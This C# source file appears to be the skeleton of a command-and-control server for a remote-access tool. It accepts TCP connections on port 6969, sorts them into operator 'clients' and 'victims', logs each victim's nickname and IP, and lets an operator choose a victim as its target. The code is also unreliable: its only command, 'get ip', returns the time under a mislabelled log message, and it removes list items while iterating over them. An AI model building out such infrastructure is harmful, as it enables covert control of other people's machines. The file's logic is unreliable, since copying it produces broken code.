﻿using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace Wubalubadubdub_Server
{
    class Program
    {
        private static Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static List<Client> clients = new List<Client>();
        private static List<Victim> victims = new List<Victim>();
        private const int bufferSize = 2048;
        private const int PORT = 6969;
        private static byte[] buffer = new byte[bufferSize];

        static void Main()
        {
            Console.Title = "Server";
            SetupServer();
            while (!Console.ReadLine().ToLower().Equals("exit")) {}
            CloseAllSockets();
        }

        private static void SetupServer()
        {
            Console.WriteLine("Starting Server.");
            serverSocket.Bind(new IPEndPoint(IPAddress.Any, PORT));
            Console.WriteLine("Starting Server..");
            serverSocket.Listen(0);
            Console.WriteLine("Starting Server...");
            serverSocket.BeginAccept(AcceptCallback, null);
            Console.WriteLine("Server setup complete");
        }
        
        private static void CloseAllSockets()
        {
            foreach (Client c in clients)
            {
                c.socket.Shutdown(SocketShutdown.Both);
                c.socket.Close();
            }
            serverSocket.Close();
        }

        private static void AcceptCallback(IAsyncResult asyncResult)
        {
            Socket socket;

            try
            {
                socket = serverSocket.EndAccept(asyncResult);
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            socket.Receive(buffer);
            string text = Encoding.ASCII.GetString(buffer);
            
            if (text.Contains("client"))
            {
                clients.Add(new Client(socket));
                Console.WriteLine("Client connected, waiting for request...");
            }
            else
            {
                victims.Add(new Victim(socket, text.Split('~')[0]));
                Console.WriteLine("Victim '" + text.Split('~')[0] + "' connected at "+socket.RemoteEndPoint.ToString().Split(':')[0]);
            }
            
            socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
            serverSocket.BeginAccept(AcceptCallback, null);
        }

        private static void ReceiveCallback(IAsyncResult asyncResult)
        {
            Socket socket = (Socket)asyncResult.AsyncState;
            int received = 0;

            try
            {
                received = socket.EndReceive(asyncResult);
            }
            catch (SocketException)
            {
                Console.WriteLine("Client forcefully disconnected");
                // Don't shutdown because the socket may be disposed and its disconnected anyway.
                socket.Close(); 
                foreach (Client c in clients)
                {
                    if (c.socket == socket)
                    {
                        clients.Remove(c);
                    }
                }
                return;
            }

            byte[] recBuf = new byte[received];
            Array.Copy(buffer, recBuf, received);
            string text = Encoding.ASCII.GetString(recBuf);
            Console.WriteLine("Received Command: " + text);

            Client client = null;
            foreach (Client c in clients)
            {
                if (c.socket == socket)
                {
                    client = c;
                }
            }

            if (text.ToLower().Contains("set target"))
            {
                Victim old = client.target;
                String targetName = text.Split(' ')[2];
                foreach (Victim v in victims)
                {
                    if (v.nickName.Equals(targetName))
                    {
                        client.target = v;
                        byte[] data = Encoding.ASCII.GetBytes("Target set to "+targetName);
                        socket.Send(data);
                    }
                }

                if (client.target == old)
                {
                    byte[] data = Encoding.ASCII.GetBytes("No target found");
                    socket.Send(data);
                    client.target = null;
                }
            }
            
            else if (client.target != null)
            {
                if (text.ToLower() == "get ip")
                {
                    Console.WriteLine("Text is a get time request");
                    byte[] data = Encoding.ASCII.GetBytes(DateTime.Now.ToLongTimeString());
                    socket.Send(data);
                    Console.WriteLine("Time sent to client");
                }
                else
                {
                    Console.WriteLine("Invalid Command entered");
                    byte[] data = Encoding.ASCII.GetBytes("Invalid Command");
                    socket.Send(data);
                }
            }
            else if (text.ToLower() == "exit")
            {
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();

                clients.Remove(client);
                
                Console.WriteLine("Client disconnected");
                return;
            }
            else
            {
                Console.WriteLine("No Target set");
                byte[] data = Encoding.ASCII.GetBytes("No Target set");
                socket.Send(data);
            }

            socket.BeginReceive(buffer, 0, bufferSize, SocketFlags.None, ReceiveCallback, socket);
        }
    }
}